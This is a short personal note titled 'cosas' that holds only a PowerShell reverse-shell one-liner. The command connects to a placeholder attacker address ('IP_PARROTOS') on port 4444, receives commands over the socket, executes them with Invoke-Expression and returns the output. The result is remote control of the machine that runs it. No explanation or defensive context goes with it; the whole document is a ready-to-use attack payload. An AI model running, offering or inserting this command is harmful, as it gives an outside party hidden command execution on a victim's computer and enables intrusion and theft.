# cosas
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP_PARROTOS', 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); while ($true) { $writer.WriteLine($reader.ReadLine()); $writer.Flush(); $input = $reader.ReadLine(); if ($input -eq 'exit') { break; } else { $output = Invoke-Expression $input; $writer.WriteLine($output); $writer.Flush(); } } $client.Close()"

